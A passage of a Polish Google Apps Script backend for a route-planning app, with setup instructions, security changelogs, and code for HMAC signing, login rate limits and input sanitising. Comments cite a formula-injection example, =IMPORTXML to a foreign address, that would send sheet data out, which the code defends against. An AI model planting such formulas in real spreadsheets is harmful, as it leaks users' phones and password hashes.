/**********************************************************************
 *  PMT Planer — backend w Google Apps Script
 *
 *  CO TO ROBI: odbiera "pulsy" od programu (kto, jaka wersja, ile
 *  dokumentów itd.), zapisuje je w arkuszu i odsyła programowi jego
 *  status: do kiedy ważna sesja + lista nieobecności (urlopy/L4/
 *  zastępstwa) do uwzględnienia w planowaniu tras.
 *
 *  ┌────────────────────────────────────────────────────────────────┐
 *  │ AKTUALIZUJESZ DZIAŁAJĄCY BACKEND? POMIŃ „JAK URUCHOMIĆ" NIŻEJ. │
 *  │ Nie twórz arkusza, nie uruchamiaj żadnej funkcji i NIGDY nie   │
 *  │ klikaj „Nowe wdrożenie" — to daje NOWY adres /exec, którego    │
 *  │ program nie zna. Zrób tylko „WDROŻENIE: TRZY                   │
 *  │ RZECZY" niżej (i WYDANIE.txt w repozytorium).                  │
 *  └────────────────────────────────────────────────────────────────┘
 *
 *  JAK URUCHOMIĆ — TYLKO PIERWSZA INSTALACJA, NA PUSTYM ARKUSZU:
 *  1. Wejdź na sheets.new — utworzy się nowy arkusz. Nazwij go np.
 *     "PMT Planer — administracja".
 *  2. W arkuszu: Rozszerzenia → Apps Script. Skasuj przykładowy kod,
 *     wklej CAŁY ten plik, zapisz (ikona dyskietki).
 *  3. W edytorze uruchom raz funkcję "inicjalizuj" (wybierz ją z listy
 *     u góry i kliknij ▶ Uruchom). Zgódź się na uprawnienia (pyta tylko
 *     przy pierwszym razie; ostrzeżenie "niezweryfikowana aplikacja"
 *     → Zaawansowane → Otwórz). Zakładki i nagłówki utworzą się same.
 *  4. Wdróż → Nowe wdrożenie → typ: Aplikacja internetowa →
 *     "Wykonuj jako: Ja", "Dostęp: Każdy" → Wdróż.
 *  5. Skopiuj adres URL wdrożenia (kończy się na /exec) — ten adres
 *     wkleja się do programu (stała URL_BACKENDU).
 *
 *  PANEL ADMINISTRATORA = ten arkusz. Przedłużenie sesji użytkownika
 *  to wpisanie nowej daty w kolumnie "Wazne do". Statystyki aktualizują
 *  się same przy każdym pulsie.
 *
 *  UWAGA PO ZMIANACH KODU: po każdej edycji tego skryptu trzeba zrobić
 *  Wdróż → Zarządzaj wdrożeniami → ołówek → Wersja: Nowa → Wdróż,
 *  inaczej pod adresem /exec dalej działa stara wersja.
 *
 *  ── ZMIANY PRZY WYDANIU 3.25.1 — POPRAWKI PO PRZEGLĄDZIE (wdróż TERAZ) ──
 *  Program na komputerze i aplikacja webowa działają bez zmian (web z tej
 *  paczki wysyła klient: "web" — punkt 6).
 *  1. PODPIS HASŁEM Z LIMITEM. Puls, sesja i hasło paczki mówiły, czy podpis
 *     kluczem z hasła pasuje, bez żadnego licznika — można było zgadywać hasło
 *     z pominięciem limitu logowania. Teraz 150 złych podpisów na kod w 6 h =
 *     podpis nie jest sprawdzany (puls bez danych, hasło paczki „odmowa”), aż
 *     minie okno albo konto zaloguje się hasłem. Wpis w Log: „podpis_hasla”.
 *  2. FORMUŁY: puls z pustym polem „system”/„wersja” zapisywał z powrotem
 *     wartość z arkusza bez apostrofu (stawała się formułą). Naprawione.
 *  3. RESET HASŁA: limit w stałym oknie (odrzucone próby nie przedłużają
 *     blokady), licznik łączny liczy tylko nieudane próby. Nowa funkcja
 *     odblokujKonta() — uruchom ją ręcznie w edytorze, gdy ktoś jest
 *     zablokowany limitem prób i nie może czekać.
 *  4. DZIENNIKI: zdarzenia po udanym uwierzytelnieniu (logowanie, zmiana
 *     i reset hasła, hasło paczki, Sesje) mają osobny przydział wpisów;
 *     odmowy bez hasła (zły kod, zły podpis, błąd serwera) — jeden wpis na
 *     godzinę. Bez blokady skryptu (kolejka > 20 s) odpowiedź „Serwer zajety”.
 *  5. Logowanie i zmiana hasła nie zdradzają już, że podany telefon należy
 *     do kodu (konto z hasłem: zawsze „Nieprawidlowe haslo…”).
 *  6. WYMAGANA_WERSJA nie odcina aplikacji web; w kolumnie „Wersja” web
 *     ma dopisek „web” (np. „web 3.24.0”).
 *  7. Arkusz: hasło paczki w komórce innej niż tekst/liczba całkowita (data,
 *     ułamek) = „brak” + wpis w Log; daty wpisane tekstem DD.MM.RRRR czytane
 *     jako dzień.miesiąc (dotąd 10.11 dawało 11 października). Komórkę hasła
 *     paczki ustaw na Format → Liczba → Zwykły tekst i wpisz hasło ponownie.
 *
 *  ── ZMIANY PRZY WYDANIU 3.25.0 — AUDYT BEZPIECZEŃSTWA (wdróż TERAZ) ──
 *  Wszystko poniżej obowiązuje od razu po wdrożeniu nowej wersji skryptu
 *  (Wdróż → Zarządzaj wdrożeniami → ołówek → Wersja: Nowa), program na
 *  komputerze i aplikacja webowa działają bez zmian.
 *  1. FORMUŁY W ARKUSZU (krytyczne). Napis od klienta zaczynający się od
 *     = + - @ (np. w polu „system” pulsu albo w kodzie w resecie hasła)
 *     trafiał do arkusza jako FORMUŁA — =IMPORTXML("https://obcy/?"&…)
 *     wysłałoby treść arkusza (kody, telefony, skróty haseł) pod obcy adres.
 *     Adres /exec jest publiczny, więc mógł to zrobić każdy. Teraz każdy
 *     napis przechodzi przez _tekst() (apostrof = zwykły tekst), a liczby
 *     przez _liczba() (granice).
 *  2. ZGADYWANIE HASEŁ. Logowanie i zmiana hasła nie miały limitu prób.
 *     Teraz: 8 nieudanych prób na kod w 15 minut albo 25 w 6 godzin =
 *     blokada (także dla dobrego hasła). „Nie pamiętam hasła” (telefon
 *     z kartoteki) i udane logowanie zerują licznik. Zgadywanie różnych
 *     kodów nikogo nie blokuje. Cena: osoba znająca cudzy kod może go
 *     zablokować na czas okna — odblokowuje „Nie pamiętam hasła”.
 *  3. FAŁSZYWE KONTA. Puls z nieznanego kodu zakładał w arkuszu nowe konto
 *     (30 dni dostępu) — każdy mógł zasypać arkusz. Teraz odmowa
 *     (PULS_TWORZY_NOWE_KODY = false). Rejestr sesji przyjmuje tylko
 *     istniejące konta, a dzienniki (Log, Sesje) mają limit wpisów na godzinę.
 *  4. Kod w resecie i zmianie hasła musi mieć 5 cyfr (jak w logowaniu);
 *     błąd serwera nie zdradza klientowi szczegółów skryptu; zapytanie
 *     większe niż 20 kB jest odrzucane.
 *  5. PULS I SESJA WYMAGAJĄ HASŁA (WYMAGAJ_HASLA_W_PULSIE = true). Puls nigdy
 *     nie sprawdzał hasła — ufał samemu 5-cyfrowemu kodowi, więc każdy znający
 *     (lub wyliczający) cudzy kod dostawał imię, rejon i nieobecności (L4,
 *     urlopy) i mógł fałszować statystyki i rejestr sesji. Teraz klient podpisuje
 *     puls i sesję kluczem pochodnym od hasła (HMAC; klucz = skrót hasła z
 *     kolumny „Haslo hash”, hasło nigdzie nie jedzie). Bez podpisu: odpowiedź
 *     tylko ze statusem i datą ważności, nic nie jest zapisywane. WYMAGA programu
 *     na komputerze z tą zmianą (PMT_Delegacje.py) i aplikacji webowej z tej
 *     paczki; starsze programy dostaną w pulsie puste imię/rejon/nieobecności
 *     (dostęp i logowanie działają jak dotąd). Na czas przejścia możesz
 *     ustawić WYMAGAJ_HASLA_W_PULSIE = false.
 *
 *  Sprawdź po wdrożeniu: otwórz adres /exec — „sekrety”:1; zaloguj się
 *  z programu i z aplikacji webowej; w zakładce Log ma przybyć wpis.
 *
 *  ── ZMIANY PRZY WYDANIU 3.24.0 (co zmieniono, co trzeba wdrożyć) ──
 *  1. zmienHaslo: numer telefonu ustawia hasło TYLKO na koncie, które
 *     hasła jeszcze nie ma (pierwsze logowanie albo tuż po resecie) —
 *     ten sam warunek, co w logowanie(). Dotąd kto znał cudzy numer,
 *     podmieniał cudze hasło. Program: zmiana hasła = dotychczasowe
 *     hasło; „Nie pamiętam hasła" = reset_hasla + zmien_haslo telefonem
 *     (hash już skasowany, więc przechodzi) — działa bez zmian.
 *  2. resetHasla: limit prób w CacheService — 5 na godzinę na kod
 *     i 30 na godzinę łącznie (Apps Script nie zdradza adresu
 *     wywołującego, więc licznik „na adres" zastępuje licznik łączny).
 *     KAŻDA próba (także odrzucona) ląduje w zakładce Log.
 *  3. puls: odpowiedź niesie tylko nieobecności pytającego kodu oraz
 *     kodów, które on zastępuje — nie całego zespołu. Program tylko
 *     zapisuje tę listę w pamięci podręcznej, nic z cudzych wpisów nie
 *     czyta, więc nic mu nie ubywa.
 *  4. Blok bezpieczeństwa (SEKRETY_PMT, AKCJE_PODPISANE,
 *     weryfikujPodpis, wersjaZaStara) jest TERAZ W TYM PLIKU i doPost
 *     sam go woła. Wcześniej wklejało się go osobno z
 *     BACKEND_APPS_SCRIPT.txt — przy wklejaniu całego Code.gs ginął
 *     razem z resztą i backend zostawał BEZ weryfikacji podpisu.
 *  5. Aplikacja na telefon wycofana: backend obsługuje już tylko program
 *     na komputerze (logowanie, puls, sesja, zmien_haslo, reset_hasla).
 *     Zniknęły analiza zdjęć na klucz Anthropic, zgłoszenia i zdjęcia
 *     produktów na Dysku, planogramy, wizyty i pulpit — a z nimi dwie
 *     znane dziury (każdy znający /exec mógł używać Twojego klucza
 *     i wrzucać publiczne zdjęcia). Zakładki z danymi w arkuszu zostają
 *     nietknięte; klucz ANTHROPIC_KLUCZ możesz usunąć z Właściwości.
 *
 *  ── WDROŻENIE: TRZY RZECZY, W TEJ KOLEJNOŚCI ────────────────────
 *  A. W Code.gs zaznacz wszystko (Ctrl+A) i wklej CAŁY ten plik —
 *     ma ZASTĄPIĆ dotychczasową treść, nie dopisać się do niej. Dwie
 *     funkcje o tej samej nazwie w jednym pliku to cicha pomyłka:
 *     JavaScript bierze ostatnią.
 *  B. Wpisz sekret w liście SEKRETY_PMT (zaraz pod nagłówkiem)
 *     w miejsce zaślepki <NOWY_SEKRET>. PODPIS_OBOWIAZKOWY zostaw na
 *     false — włączasz go dopiero, gdy cały zespół ma nową wersję.
 *  C. Wdróż → Zarządzaj wdrożeniami → ołówek → Wersja: Nowa → Wdróż.
 *     Adres /exec zostaje ten sam.
 *  D. Otwórz adres /exec w przeglądarce. Ma pokazać "sekrety":1
 *     i "podpis_obowiazkowy":false. Zero sekretów znaczy, że punkt B
 *     został pominięty — wróć do niego i wdróż jeszcze raz.
 *  Na koniec sprawdź z programu: logowanie, „Nie pamiętam hasła",
 *  jedna wygenerowana delegacja (w arkuszu ma przybyć puls).
 *********************************************************************/

var ZAKLADKA_UZYTKOWNICY  = "Uzytkownicy";
var ZAKLADKA_NIEOBECNOSCI = "Nieobecnosci";
var ZAKLADKA_LOG          = "Log";
var ZAKLADKA_USTAWIENIA   = "Ustawienia";

// Ile dni sesji dostaje NOWY kod przy pierwszym kontakcie, zanim
// zdążysz ręcznie ustawić datę (0 = nowy kod od razu zablokowany).
var DOMYSLNE_DNI_NOWEGO = 30;

/* ══════════════════════════════════════════════════════════════════ */
/*  PODPIS ZAPYTAŃ — blok bezpieczeństwa                              */
/*                                                                    */
/*  Do 3.23.0 ten blok wklejało się ręcznie z BACKEND_APPS_SCRIPT.txt. */
/*  Przy wklejaniu całego Code.gs ginął razem z resztą pliku i backend */
/*  zostawał BEZ weryfikacji podpisu — po cichu, bo nic się nie psuło. */
/*  Dlatego od teraz leży TUTAJ, w jednym pliku z rozdzielaczem akcji. */
/*                                                                    */
/*  JEDYNE, CO MUSISZ TU ZMIENIĆ: lista SEKRETY_PMT poniżej.          */
/* ══════════════════════════════════════════════════════════════════ */

// Sekret aplikacji: ten sam napis, co w sekrecie repozytorium PMT_SEKRET
// (budowanie robi z niego sekret.txt w paczce). Lista przyjmuje kilka
// pozycji — przyda się przy przyszłej wymianie sekretu (nowy PRZED
// starym, stary usuwany po aktualizacji zespołu).
//
// W miejsce <...> wpisz prawdziwą wartość. W tym pliku jej celowo nie
// ma i nigdy być nie może — plik leży w repozytorium, które pamięta
// każdą swoją wersję.
var SEKRETY_PMT = [
  '<NOWY_SEKRET>'
];

// Czy akcje z AKCJE_PODPISANE BEZ poprawnego podpisu są odrzucane.
//
// false = okres przejściowy: podpis jest sprawdzany, ale brak lub zły
//         podpis niczego nie blokuje. Tak backend działał dotąd w ogóle
//         (bloku bezpieczeństwa nie było we wdrożonym skrypcie), więc
//         wdrożenie tego pliku nikogo nie odcina — także osób, które
//         jeszcze nie zaktualizowały programu.
// true  = podpis obowiązkowy. Włącz, gdy cały zespół ma 3.24.0
//         (kolumna „Wersja" w zakładce Uzytkownicy) — starsze wersje
//         nie zalogują się wtedy wcale (podpis obejmuje też logowanie).
var PODPIS_OBOWIAZKOWY = false;

// Od tej wersji paczki niosą sekret (sekret.txt). Starsze podpisywały
// ujawnionym kluczem z kodu albo wcale — ich podpis w okresie przejściowym
// pomijamy w dzienniku, żeby wpis „podpis_zly" znaczył tylko jedno:
// rozjazd sekretu w nowej paczce.
var WERSJA_Z_SEKRETEM = '3.24.0';

// Akcje, które wymagają podpisu — WSZYSTKIE, jakie backend obsługuje.
// Aplikacja na telefon (jedyny klient bez podpisu) została wycofana,
// a program na komputerze podpisuje każde zapytanie. Po włączeniu
// PODPIS_OBOWIAZKOWY nikt bez sekretu aplikacji nie zaloguje się, nie
// zmieni hasła i nie wyzeruje go przez sam adres /exec.
var AKCJE_PODPISANE = ['logowanie', 'puls', 'sesja', 'zmien_haslo', 'reset_hasla', 'haslo_paczki'];

// Odcięcie starych wersji programu. Puste = nie odcinamy nikogo.
// Wpisz numer (np. '3.24.0') dopiero wtedy, gdy zespół ma już nową
// wersję — zalecane 14 dni po publikacji wydania.
var WYMAGANA_WERSJA = '';

// Pozycje z listy, które są jeszcze zaślepką <...> albo pustym napisem,
// NIE mogą nigdy nic potwierdzić. Dzięki temu świeżo wklejony skrypt
// bez wpisanych sekretów odmawia wszystkiego (fail-closed), a nie
// przyjmuje czegokolwiek.
function _pmtSekrety() {
  var ok = [];
  for (var i = 0; i < SEKRETY_PMT.length; i++) {
    var s = String(SEKRETY_PMT[i] || '');
    if (s && s.charAt(0) !== '<') ok.push(s);
  }
  return ok;
}

function _pmtHex(sig) {
  return sig.map(function (b) {
    return ('0' + (b & 255).toString(16)).slice(-2);
  }).join('');
}

function weryfikujPodpis(d) {
  try {
    var czas = Number(d.klucz_czas || 0);
    if (!czas || Math.abs(Date.now() / 1000 - czas) > 600) return false;
    var baza = String(d.kod || '') + '|' + String(d.akcja || '') + '|' + czas;
    var podany = String(d.podpis || '');
    if (!podany) return false;
    var lista = _pmtSekrety();
    for (var i = 0; i < lista.length; i++) {
      var sig = Utilities.computeHmacSha256Signature(baza, lista[i]);
      if (_pmtHex(sig) === podany) return true;
    }
    return false;
  } catch (e) { return false; }
}

function _wersjaCoNajmniej(w, prog) {
  if (!w) return false;
  var a = String(w).split('.'), b = String(prog).split('.');
  for (var i = 0; i < 3; i++) {
    var x = Number(a[i] || 0), y = Number(b[i] || 0);
    if (x > y) return true;
    if (x < y) return false;
  }
  return true;
}

function wersjaZaStara(w) {
  if (!WYMAGANA_WERSJA) return false;        // odcinanie wyłączone
  // BRAK POLA „wersja" = NIE ODCINAMY: bez numeru nie da się uczciwie
  // ocenić, czy to stara wersja (programy od 3.21 zawsze go wysyłają).
  if (!w) return false;
  var a = String(w).split('.'), b = WYMAGANA_WERSJA.split('.');
  for (var i = 0; i < 3; i++) {
    var x = Number(a[i] || 0), y = Number(b[i] || 0);
    if (x > y) return false;
    if (x < y) return true;
  }
  return false;
}

/* ══════════════════════════════════════════════════════════════════ */
/*  DANE OD KLIENTA TRAFIAJĄ DO ARKUSZA — blok bezpieczeństwa (3.25.0) */
/*                                                                    */
/*  1. FORMUŁY. Tekst zaczynający się od = + - @ zapisany do arkusza   */
/*     staje się FORMUŁĄ, a formuła =IMPORTXML("https://obcy/?"&…)    */
/*     wysyła treść Twojego arkusza (kody, telefony, skróty haseł)     */
/*     pod obcy adres, gdy tylko ktoś otworzy arkusz. Adres /exec jest */
/*     publiczny, a sekret aplikacji widać na stronie — więc KAŻDY     */
/*     napis od klienta przechodzi przez _tekst(), zanim trafi do      */
/*     komórki (apostrof na początku = zwykły tekst).                  */
/*  2. LIMITY. Nieudane logowania i zmiany hasła są liczone na kod:    */
/*     po przekroczeniu limitu odmowa, także dla dobrego hasła.        */
/*     Wpisy do dzienników mają limit na godzinę (nikt nie zapełni     */
/*     arkusza śmieciami).                                             */
/* ══════════════════════════════════════════════════════════════════ */

// Czy puls z NIEZNANEGO kodu zakłada w arkuszu nowy wiersz (stare zachowanie).
// Program loguje się PRZED pulsem, a logowanie wymaga wiersza w arkuszu, więc
// puls z nieznanego kodu nie zdarza się u prawdziwego użytkownika — za to
// każdy znający adres /exec mógł tak zasypać arkusz tysiącami fałszywych kont.
var PULS_TWORZY_NOWE_KODY = false;

// PULS I SESJA WYMAGAJĄ HASŁA. Dotąd puls ufał samemu 5-cyfrowemu kodowi: każdy,
// kto znał (albo wyliczył) cudzy kod, dostawał imię, rejon i nieobecności (L4,
// urlopy) i mógł podrabiać statystyki i rejestr sesji. Teraz program i aplikacja
// webowa podpisują puls i sesję KLUCZEM POCHODNYM OD HASŁA: HMAC-SHA256, którego
// kluczem jest skrót hasła „PMT|kod|hasło” — ten sam, który backend trzyma w kolumnie
// „Haslo hash” i który klient ma zapisany po logowaniu (samo hasło nigdzie nie jedzie).
// Bez poprawnego podpisu puls dostaje tylko status i datę ważności (stare programy
// muszą wiedzieć, że konto wygasło) — bez imienia, rejonu i nieobecności — i niczego
// nie zapisuje; sesja jest po cichu pomijana. Zmiana lub reset hasła unieważnia stary klucz.
// false = okres przejściowy dla zespołu, który nie ma jeszcze programu z tą zmianą.
var WYMAGAJ_HASLA_W_PULSIE = true;

// Nieudane logowania/zmiany hasła na jeden kod: krótkie okno i długie okno.
var LOGOWANIE_NIEUDANYCH_KROTKO = 8;     var LOGOWANIE_OKNO_KROTKIE = 900;      // 8 prób na 15 minut
var LOGOWANIE_NIEUDANYCH_DLUGO  = 25;    var LOGOWANIE_OKNO_DLUGIE  = 21600;    // 25 prób na 6 godzin (maks. TTL CacheService)
// Złe podpisy hasłem (puls, sesja, haslo_paczki) na jeden kod. Klucz podpisu to skrót „PMT|kod|hasło”, który każdy policzy
// dla dowolnego kandydata, a odpowiedź (pelne, odmowa) mówi, czy trafił — bez limitu to zgadywanie hasła z pominięciem
// limitu logowania. Osobny licznik, nie lg:*: urządzenie ze starym hasłem (zmienionym gdzie indziej) pulsuje — program co 15 minut,
// aplikacja web także przy powrocie do karty (do ok. 72 razy na 6 godzin na kartę; od tej wersji po pierwszym „pelne: false”
// przestaje podpisywać hasłem) — i nie może przez to odciąć urządzenia z aktualnym hasłem ani blokować logowania.
// 150 na 6 godzin to nadal setki razy mniej niż zgadywanie bez limitu. Udane logowanie licznik zeruje.
var PODPIS_HASLA_ZLYCH = 150;            var PODPIS_HASLA_OKNO = 21600;
// Ile wpisów na godzinę wolno dopisać do dzienników (Log, Sesje).
var WPISOW_NA_GODZINE = 3000;
// Wpisy po udanym uwierzytelnieniu (logowanie, zmiana i reset hasła, wydanie hasła paczki, rejestr sesji) mają osobny przydział:
// zalew zapytań bez hasła (zły kod, brak podpisu) nie może ukryć tych zdarzeń. Każdy kod ma w nim własną część, więc i jedno
// konto go nie wyczerpie; po wyczerpaniu wpis idzie jeszcze ze wspólnej puli.
var WAZNYCH_NA_GODZINE = 1000;           var WAZNYCH_NA_KOD = 60;

/* Napis od klienta -> bezpieczna wartość komórki: bez znaków sterujących,
   przycięty, a gdy zaczyna się od = + - @ — z apostrofem (tekst, nie formuła). */
function _tekst(v, maks) {
  var s = String(v === undefined || v === null ? "" : v)
            .replace(/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/g, " ").trim();
  if (maks) s = s.slice(0, maks);
  if (/^[=+\-@]/.test(s)) s = "'" + s;
  return s;
}
/* Liczba od klienta -> liczba całkowita z przedziału 0..maks (śmieci = 0). */
function _liczba(v, maks) {
  var n = Math.round(Number(v));
  return isFinite(n) ? Math.max(0, Math.min(maks, n)) : 0;
}
/* Wersja do kolumn „Wersja” (Uzytkownicy, Sesje): aplikacja web z dopiskiem — jej numer to wersja silnika, nie programu,
   więc bez dopisku jej użytkownicy wyglądaliby na maruderów ze starym programem. */
function _wersjaKlienta(dane) {
  var w = _tekst(dane.wersja, 20);
  return w && dane.klient === "web" ? _tekst("web " + w, 20) : w;
}
function _kodPoprawny(kod) { return /^\d{5}$/.test(String(kod)); }

/* Licznik w CacheService z OKNEM STAŁYM (nie odnawia się przy kolejnych
   próbach): zwraca nową liczbę zdarzeń w oknie. doPost trzyma ScriptLock,
   więc odczyt-zapis nie ściga się z innym wywołaniem. */
function _licznik(klucz, okno, dodaj) {
  var pam = CacheService.getScriptCache(), teraz = Date.now(), n = 0, t0 = teraz;
  var zap = pam.get(klucz);
  if (zap) { var cz = String(zap).split("|"); n = Number(cz[0]) || 0; t0 = Number(cz[1]) || teraz; }
  if (!dodaj) return n;
  n += 1;
  var zostalo = Math.max(1, Math.round(okno - (teraz - t0) / 1000));
  pam.put(klucz, n + "|" + t0, zostalo);
  return n;
}
function _logowanieZablokowane(kod) {
  return _licznik("lg:k:" + kod, LOGOWANIE_OKNO_KROTKIE, false) >= LOGOWANIE_NIEUDANYCH_KROTKO
      || _licznik("lg:d:" + kod, LOGOWANIE_OKNO_DLUGIE, false) >= LOGOWANIE_NIEUDANYCH_DLUGO;
}
function _nieudanaProba(kod) {
  _licznik("lg:k:" + kod, LOGOWANIE_OKNO_KROTKIE, true);
  _licznik("lg:d:" + kod, LOGOWANIE_OKNO_DLUGIE, true);
}
/* Próba na NIEISTNIEJĄCY kod: jeden wspólny licznik zamiast klucza na każdy kod. Licznik na nieistniejący kod niczego nie chroni,
   a 100 000 możliwych kodów pozwalałoby zapełnić CacheService (ok. 1000 pozycji; przy przepełnieniu wypadają pozycje najbliżej
   wygaśnięcia, także liczniki prób prawdziwych kont). Zgadywanie kodów zostawia ślad w Log po przekroczeniu progu. */
var NIEZNANYCH_KODOW_NA_GODZINE = 50;
function _nieznanyKod(ss, zdarzenie) {
  if (_licznik("lg:nieznany", 3600, true) === NIEZNANYCH_KODOW_NA_GODZINE)
    _log(ss, "?", zdarzenie, NIEZNANYCH_KODOW_NA_GODZINE + " prob na nieistniejace kody w godzine (zgadywanie kodow?)");
}
function _wyczyscProby(kod) {
  var pam = CacheService.getScriptCache(); pam.remove("lg:k:" + kod); pam.remove("lg:d:" + kod); pam.remove("ph:" + kod);
}
var KOMUNIKAT_ZLE_HASLO = "Nieprawidlowe haslo. Jesli go nie pamietasz, uzyj „Nie pamietam hasla” (numer telefonu z kartoteki sluzy do resetu hasla).";
var KOMUNIKAT_BLOKADY = "Za duzo nieudanych prob — konto zablokowane na pewien czas (do kilku godzin). " +
                        "Mozesz odblokowac je od razu przez „Nie pamietam hasla” (numer telefonu) albo napisac do administratora.";

/* Limit wpisów do dzienników na godzinę: po przekroczeniu wpisy są pomijane. kodWazny = wpis po uwierzytelnieniu tego kodu. */
function _wolnoDopisac(kodWazny, pula) {
  var p = "wpisy:" + (pula || "wazne");      // „wazne” i „konto” mają osobne przydziały (odmowy na istniejące konta nie wypierają zdarzeń po uwierzytelnieniu)
  if (kodWazny && _licznik(p + ":" + kodWazny, 3600, true) <= WAZNYCH_NA_KOD
      && _licznik(p, 3600, true) <= WAZNYCH_NA_GODZINE) return true;
  return _licznik("wpisy:godz", 3600, true) <= WPISOW_NA_GODZINE;
}

/* Uwierzytelnienie HASŁEM dla puls/sesja: podpis HMAC-SHA256 kluczem = skrót hasła
   (hashBaza z kolumny „Haslo hash”). Konto bez hasła (jeszcze go nie ustawiło) nie ma
   klucza, więc nie przechodzi — musi najpierw ustawić hasło, czego i tak wymaga program.
   Znacznik czasu ten sam co w podpisie aplikacji (okno 10 minut).
   Każdy zły podpis liczy się jak próba hasła (PODPIS_HASLA_ZLYCH): po przekroczeniu limitu podpis nie jest już
   sprawdzany wcale (także dobry), aż minie okno albo konto zaloguje się hasłem. */
function _podpisHaslaOk(dane, hashBaza) {
  try {
    if (!hashBaza) return false;
    var czas = Number(dane.klucz_czas || 0);
    if (!czas || Math.abs(Date.now() / 1000 - czas) > 600) return false;
    var podany = String(dane.podpis_hasla || "");
    if (!podany) return false;
    var kod = String(dane.kod || "").trim(), klucz = "ph:" + kod;
    if (_licznik(klucz, PODPIS_HASLA_OKNO, false) >= PODPIS_HASLA_ZLYCH) return false;
    var baza = String(dane.kod || "") + "|" + String(dane.akcja || "") + "|" + czas;
    var sig = Utilities.computeHmacSha256Signature(baza, String(hashBaza));
    if (_pmtHex(sig) === podany) return true;
    if (_licznik(klucz, PODPIS_HASLA_OKNO, true) === PODPIS_HASLA_ZLYCH)
      _log(SpreadsheetApp.getActiveSpreadsheet(), kod, "podpis_hasla",
           "ZABLOKOWANY (" + PODPIS_HASLA_ZLYCH + " zlych podpisow haslem w 6 h) — puls bez danych i bez hasla paczki do udanego logowania", "wazne");
    return false;
  } catch (e) { return false; }
}
function _czyUwierzytelniony(dane, hashBaza) {
  return !WYMAGAJ_HASLA_W_PULSIE || _podpisHaslaOk(dane, hashBaza);
}

/* ------------------------------------------------------------------ */
/*  Inicjalizacja arkusza — uruchom RAZ ręcznie po wklejeniu skryptu  */
/* ------------------------------------------------------------------ */
function inicjalizuj() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  _zakladka(ss, ZAKLADKA_UZYTKOWNICY, [
    "Kod", "Imie i nazwisko", "Rejon", "Wazne do",
    "Ostatni kontakt", "Wersja", "System",
    "Uruchomien", "Dokumentow", "Minut pracy", "Uwagi"
  ]);
  _zakladka(ss, ZAKLADKA_NIEOBECNOSCI, [
    "Kod", "Od", "Do", "Typ", "Zastepuje kod", "Uwagi"
  ]);
  _zakladka(ss, ZAKLADKA_LOG, [
    "Kiedy", "Kod", "Zdarzenie", "Szczegoly"
  ]);
  _zakladka(ss, ZAKLADKA_SESJE,
    ["Kiedy", "Kod", "Imie i nazwisko", "Zdarzenie", "Czas sesji (min)",
     "Dokumenty w sesji", "Plany wizyt", "Wersja programu"]);
  _ustawieniaPaczki(ss);
  // kolumna N (Haslo hash) w Uzytkownicy — naglowek, jesli go nie ma
  var shU = ss.getSheetByName(ZAKLADKA_UZYTKOWNICY);
  if (shU && !String(shU.getRange(1, 14).getValue())) shU.getRange(1, 14).setValue("Haslo hash");
}

function _zakladka(ss, nazwa, naglowki) {
  var sh = ss.getSheetByName(nazwa) || ss.insertSheet(nazwa);
  if (sh.getLastRow() === 0) {
    sh.appendRow(naglowki);
    sh.getRange(1, 1, 1, naglowki.length).setFontWeight("bold");
    sh.setFrozenRows(1);
  }
  return sh;
}

/* ------------------------------------------------------------------ */
/*  Wejście HTTP                                                      */
/* ------------------------------------------------------------------ */
/*  doPost (rozdzielacz akcji) jest nizej, po obsludze pulsu.         */

// GET zostawiamy jako prosty test "czy żyje" — otwarcie adresu /exec
// w przeglądarce ma pokazać znak życia, nic więcej.
function doGet(e) {
  // „sekrety" to LICZBA wpisanych sekretów, nigdy ich treść. Otwarcie
  // adresu /exec w przeglądarce ma pokazać sekrety: 1 i stan przełącznika
  // PODPIS_OBOWIAZKOWY. Zero sekretów znaczy, że w SEKRETY_PMT została
  // zaślepka <...> — po włączeniu podpisu backend odmawiałby wtedy
  // pulsu, sesji i resetu hasła.
  return _json({ status: "ok", opis: "PMT backend dziala",
                 sekrety: _pmtSekrety().length,
                 podpis_obowiazkowy: PODPIS_OBOWIAZKOWY === true });
}

function _json(obiekt) {
  // czas serwera w każdej odpowiedzi (także w odmowie): klient z przestawionym zegarem poprawia nim czas podpisu (okno 600 s)
  if (obiekt && typeof obiekt === "object" && !Array.isArray(obiekt)) obiekt.czas_serwera = Math.floor(Date.now() / 1000);
  return ContentService.createTextOutput(JSON.stringify(obiekt))
                       .setMimeType(ContentService.MimeType.JSON);
}

/* ------------------------------------------------------------------ */
/*  Puls programu                                                     */
/* ------------------------------------------------------------------ */
function obsluzPuls(dane) {
  var kod = String(dane.kod || "").trim();
  if (!/^\d{5}$/.test(kod)) {
    return { status: "zly_kod", opis: "Kod musi miec 5 cyfr" };
  }

  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = _zakladka(ss, ZAKLADKA_UZYTKOWNICY, []);
  var wiersze = sh.getDataRange().getValues();   // [0] = nagłówki
  var nr = -1;
  for (var i = 1; i < wiersze.length; i++) {
    if (String(wiersze[i][0]).trim() === kod) { nr = i + 1; break; }
  }

  var teraz = new Date();

  // Nieznany kod → zakładamy wiersz z domyślną sesją; nazwisko i rejon
  // uzupełnisz ręcznie. Dzięki temu nie musisz wpisywać ludzi z góry.
  if (nr === -1) {
    // Domyślnie nieznany kod NIE zakłada konta (zob. PULS_TWORZY_NOWE_KODY).
    if (!PULS_TWORZY_NOWE_KODY) return { status: "zly_kod", opis: "Nieznany kod" };
    var wazneDo = new Date(teraz.getTime() + DOMYSLNE_DNI_NOWEGO * 864e5);
    sh.appendRow([kod, "", "", wazneDo, teraz,
                  _tekst(dane.wersja, 20), _tekst(dane.system, 30), 0, 0, 0,
                  "NOWY — uzupelnij dane"]);
    nr = sh.getLastRow();
    _log(ss, kod, "nowy_kod", "Pierwszy kontakt");
  }

  // Statystyki: program przysyła PRZYROSTY od ostatniej udanej
  // synchronizacji (delta), więc offline nic nie ginie — dolicza się
  // przy najbliższym połączeniu.
  var w = sh.getRange(nr, 1, 1, 14).getValues()[0];
  var pelne = _czyUwierzytelniony(dane, String(w[13] || "").trim());
  // Przyrosty z jednego pulsu mają rozsądne granice (liczby od klienta, bez hasła).
  var uruchomien = (Number(w[7]) || 0) + _liczba(dane.uruchomienia, 1000);
  var dokumentow = (Number(w[8]) || 0) + _liczba(dane.dokumenty,    1000);
  var minut      = (Number(w[9]) || 0) + _liczba(dane.minuty,       10000);

  // Puls bez podpisu hasłem nie zmienia niczego w arkuszu — ktoś znający sam
  // kod nie podrobi aktywności ani nie zafałszuje statystyk.
